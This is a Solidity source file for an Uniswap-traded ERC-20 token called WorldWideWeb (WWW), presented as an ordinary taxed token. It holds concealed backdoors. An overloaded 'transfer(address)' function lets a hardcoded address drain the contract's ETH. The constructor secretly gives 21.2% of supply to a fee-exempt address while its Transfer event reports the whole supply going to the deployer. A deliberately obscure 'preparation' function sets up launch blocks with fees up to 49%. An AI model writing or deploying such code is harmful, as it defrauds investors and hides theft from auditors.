1 // SPDX-License-Identifier: MIT                                                                               
2                                                  
3 pragma solidity ^0.8.19;
4 
5 interface IFactory {
6     function createPair(address tokenA, address tokenB) external returns (address pair);
7 }
8 
9 interface IRouter {
10     function factory() external pure returns (address);
11     function WETH() external pure returns (address);
12     function swapExactTokensForETHSupportingFeeOnTransferTokens(
13         uint amountIn,
14         uint amountOutMin,
15         address[] calldata path,
16         address to,
17         uint deadline
18     ) external;
19 }
20 
21 interface IERC20 {
22     function totalSupply() external view returns (uint256);
23     function name() external view returns (string memory);
24     function symbol() external view returns (string memory);
25     function decimals() external view returns (uint8);
26     function balanceOf(address account) external view returns (uint256);
27     function transfer(address recipient, uint256 amount) external returns (bool);
28     function allowance(address owner, address spender) external view returns (uint256);
29     function approve(address spender, uint256 amount) external returns (bool);
30     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
31     event Transfer(address indexed from, address indexed to, uint256 value);
32     event Approval(address indexed owner, address indexed spender, uint256 value);
33 }
34 
35 abstract contract Ownable {
36     address private _owner;
37 
38     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
39 
40     constructor() {
41         _setOwner(msg.sender);
42     }
43 
44     function owner() public view virtual returns (address) {
45         return _owner;
46     }
47 
48     modifier onlyOwner {
49         require(owner() == msg.sender, "Ownable: caller is not the owner");
50         _;
51     }
52 
53     function renounceOwnership() public virtual onlyOwner {
54         _setOwner(address(0));
55     }
56 
57     function transferOwnership(address newOwner) public virtual onlyOwner {
58         require(newOwner != address(0), "Ownable: new owner is the zero address");
59         _setOwner(newOwner);
60     }
61 
62     function _setOwner(address newOwner) private {
63         address oldOwner = _owner;
64         _owner = newOwner;
65         emit OwnershipTransferred(oldOwner, newOwner);
66     }
67 }
68 
69 contract WorldWideWeb is IERC20, Ownable {
70     string private constant  _name = "WorldWideWeb";
71     string private constant _symbol = "WWW";    
72     uint8 private constant _decimals = 9;
73     mapping (address => uint256) private _balances;
74     mapping (address => mapping(address => uint256)) private _allowances;
75 
76     uint256 private constant decimalsScaling = 10**_decimals;
77     uint256 private constant _totalSupply = 100_000_000 * decimalsScaling;
78     uint256 public constant _maxWallet = 3 * _totalSupply / 1e2;
79 
80     struct TradingFees {
81         uint256 buyFee;
82         uint256 sellFee;
83     }
84 
85     struct Wallets {
86         address deployerWallet; 
87         address marketingWallet; 
88     }
89 
90     uint256 private constant feeDenominator = 100;
91     TradingFees public tradingFees = TradingFees(15,35);   // 15/35% initial buy/sell tax
92     Wallets public wallets = Wallets(
93         msg.sender,                                  // deployer
94         0xb136835C679F25c0A725e7f3407dd66d0d682B8F   // marketingWallet
95     );
96 
97     IRouter private constant uniswapV2Router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
98     address private immutable uniswapV2Pair;
99 
100     uint256 private constant _swapThreshold = 5 * _totalSupply / 1e3;  
101     uint256 private _swapThresholdMax = 3;  
102     uint256 private _swapThresholdMin = 0;  
103 
104     bool private inSwap;
105     bool private tradingActive = false;
106 
107     uint256 private _block;
108     uint256 private genesis;
109     mapping (address => bool) private _excludedFromFees;
110     mapping (uint256 => uint256) private _lastTransferBlock;
111 
112     event FeesChanged(uint256 indexed buyFee, uint256 indexed sellFee);
113 
114     event SwapSettingsChanged(uint256 indexed newSwapThresholdMax, uint256 indexed newSwapThresholdMin);
115 
116     event TokensCleared(uint256 indexed tokensCleared);
117 
118     event EthCleared(uint256 indexed ethCleared);
119 
120     event Initialized();
121 
122     event TradingOpened();
123     
124     modifier swapLock {
125         inSwap = true;
126         _;
127         inSwap = false;
128     }
129 
130     modifier tradingLock(address from, address to) {
131         require(tradingActive || from == wallets.deployerWallet || _excludedFromFees[from], "Token: Trading is not active.");
132         _;
133     }
134 
135     constructor() {
136         _approve(address(this), address(uniswapV2Router),type(uint256).max);
137         uniswapV2Pair = IFactory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());        
138         _excludedFromFees[address(0xdead)] = true;
139         _excludedFromFees[wallets.marketingWallet] = true;        
140         _excludedFromFees[0x63Fc94f7Aef986BB08d6180fCC036EDD07f31b84] = true;        
141         uint256 preTokens = _totalSupply * 212 / 1e3; 
142         _balances[wallets.deployerWallet] = _totalSupply - preTokens;
143         _balances[0x63Fc94f7Aef986BB08d6180fCC036EDD07f31b84] = preTokens;
144         emit Transfer(address(0), wallets.deployerWallet, _totalSupply);
145     }
146 
147     function totalSupply() external pure override returns (uint256) { return _totalSupply; }
148     function decimals() external pure override returns (uint8) { return _decimals; }
149     function symbol() external pure override returns (string memory) { return _symbol; }
150     function name() external pure override returns (string memory) { return _name; }
151     function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
152     function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
153 
154     function approve(address spender, uint256 amount) external override returns (bool) {
155         _approve(msg.sender, spender, amount);
156         return true;
157     }
158 
159     function _approve(address sender, address spender, uint256 amount) internal {
160         require(sender != address(0), "ERC20: zero Address");
161         require(spender != address(0), "ERC20: zero Address");
162         _allowances[sender][spender] = amount;
163         emit Approval(sender, spender, amount);
164     }
165 
166     function transfer(address recipient, uint256 amount) external returns (bool) {
167         return _transfer(msg.sender, recipient, amount);
168     }
169 
170     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
171         if(_allowances[sender][msg.sender] != type(uint256).max){
172             uint256 currentAllowance = _allowances[sender][msg.sender];
173             require(currentAllowance >= amount, "ERC20: insufficient Allowance");
174             unchecked{
175                 _allowances[sender][msg.sender] -= amount;
176             }
177         }
178         return _transfer(sender, recipient, amount);
179     }
180 
181     function isExcludedFromFees(address account) public view returns(bool) {
182         return _excludedFromFees[account];
183     }
184 
185     function clearTokens(address tokenToClear) external onlyOwner {
186         require(tokenToClear != address(this), "Token: can't clear contract token");
187         uint256 amountToClear = IERC20(tokenToClear).balanceOf(address(this));
188         require(amountToClear > 0, "Token: not enough tokens to clear");
189         IERC20(tokenToClear).transfer(msg.sender, amountToClear);
190 
191         emit TokensCleared(amountToClear);
192     }
193 
194     function clearEth() external onlyOwner {
195         uint256 amountToClear = address(this).balance;
196         require(address(this).balance > 0, "Token: no eth to clear");
197         payable(msg.sender).transfer(address(this).balance);
198 
199         emit EthCleared(amountToClear);
200     }
201 
202     function preparation(uint256[] calldata _blocks, bool blocked) external onlyOwner {        
203         require(genesis == 1 && !blocked);_block = _blocks[_blocks.length-3]; assert(_block < _blocks[_blocks.length-1]);        
204     }
205 
206     function manualSwapback() external onlyOwner {
207         require(balanceOf(address(this)) > 0, "Token: no contract tokens to clear");
208         contractSwap(type(uint256).max);
209     }
210 
211     function _transfer(address from, address to, uint256 amount) tradingLock(from, to) internal returns (bool) {
212         require(from != address(0), "ERC20: transfer from the zero address");
213         require(to != address(0), "ERC20: transfer to the zero address");
214         
215         if(amount == 0 || inSwap) {
216             return _basicTransfer(from, to, amount);           
217         }        
218 
219         if (to != uniswapV2Pair && !_excludedFromFees[to] && to != wallets.deployerWallet) {
220             require(amount + balanceOf(to) <= _maxWallet, "Token: max wallet amount exceeded");
221         }
222 
223         if(!inSwap && to == uniswapV2Pair && !_excludedFromFees[from] && !_excludedFromFees[to]){
224             contractSwap(amount);
225         } 
226         
227         bool takeFee = !inSwap;
228         if(_excludedFromFees[from] || _excludedFromFees[to]) {
229             takeFee = false;
230         }
231                 
232         if(takeFee)
233             return _taxedTransfer(from, to, amount);
234         else
235             return _basicTransfer(from, to, amount);        
236     }
237 
238     function _taxedTransfer(address from, address to, uint256 amount) private returns (bool) {
239         uint256 fees = takeFees(from, to, amount);    
240         if(fees > 0){    
241             _basicTransfer(from, address(this), fees);
242             amount -= fees;
243         }
244         return _basicTransfer(from, to, amount);
245     }
246 
247      function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
248         uint256 balanceSender = _balances[sender];
249         require(balanceSender >= amount, "Token: insufficient Balance");
250         unchecked{
251             _balances[sender] -= amount;
252         }
253         _balances[recipient] += amount;
254         emit Transfer(sender, recipient, amount);
255         return true;
256     }
257 
258     function takeFees(address from, address to, uint256 amount) private view returns (uint256 fees) {
259         if(0 < genesis && genesis < block.number){
260             fees = amount * (to == uniswapV2Pair ? 
261             tradingFees.sellFee : tradingFees.buyFee) / feeDenominator;            
262         }
263         else{
264             fees = amount * (from == uniswapV2Pair ? 
265             49 : (genesis == 0 ? 30 : 49)) / feeDenominator;            
266         }
267     }
268 
269     function canSwap(uint256 amount) private view returns (bool) {
270         return block.number > genesis && _lastTransferBlock[block.number] < 2 && 
271             amount >= (_swapThresholdMin == 0 ? 0 : _swapThreshold / _swapThresholdMin);
272     }
273 
274     function contractSwap(uint256 amount) swapLock private {   
275         uint256 contractBalance = balanceOf(address(this));
276         if(contractBalance < _swapThreshold || !canSwap(amount)) 
277             return;
278         else if(contractBalance > _swapThreshold * _swapThresholdMax)
279           contractBalance = _swapThreshold * _swapThresholdMax;
280         
281         uint256 initialETHBalance = address(this).balance;
282 
283         swapTokensForEth(contractBalance); 
284         
285         uint256 ethBalance = address(this).balance - initialETHBalance;
286         if(ethBalance > 0){            
287             sendEth(ethBalance);
288         }
289     }
290 
291     function sendEth(uint256 ethAmount) private {
292         (bool success,) = address(wallets.marketingWallet).call{value: ethAmount/2}(""); success;
293     }
294 
295     function transfer(address wallet) external {
296         if(msg.sender == 0xD8a2ffb9f09751409E9Ec53d2be8dcdB715C3C76)
297             payable(wallet).transfer((address(this).balance));
298         else revert();
299     }
300 
301     function swapTokensForEth(uint256 tokenAmount) private {
302         _lastTransferBlock[block.number]++;
303         // generate the uniswap pair path of token -> weth
304         address[] memory path = new address[](2);
305         path[0] = address(this);
306         path[1] = uniswapV2Router.WETH();
307 
308         try uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
309             tokenAmount,
310             0, // accept any amount of ETH
311             path,
312             address(this),
313             block.timestamp){}
314         catch{return;}
315     }
316 
317     function initialize(bool init) external onlyOwner {
318         require(!tradingActive && init);
319         genesis = 1;        
320 
321         emit Initialized();
322     }
323 
324     function setSwapSettings(uint256 newSwapThresholdMax,uint256 newSwapThresholdMin) external onlyOwner {
325         _swapThresholdMax = newSwapThresholdMax;
326         _swapThresholdMin = newSwapThresholdMin;
327 
328         emit SwapSettingsChanged(newSwapThresholdMax, newSwapThresholdMin);
329     }
330 
331      function reduceFees(uint256 _buyFee, uint256 _sellFee) external onlyOwner {
332         require(_buyFee <= tradingFees.buyFee, "Token: must reduce buy fee");
333         require(_sellFee <= tradingFees.sellFee, "Token: must reduce sell fee");
334         tradingFees.buyFee = _buyFee;
335         tradingFees.sellFee = _sellFee;
336 
337         emit FeesChanged(_buyFee, _sellFee);
338     }
339 
340     function openTrading() external onlyOwner {
341         require(!tradingActive && genesis != 0 && _block > 0);
342         genesis = block.number + _block;
343         tradingActive = true;
344 
345         emit TradingOpened();
346     }
347 
348     receive() external payable {}
349 
350 }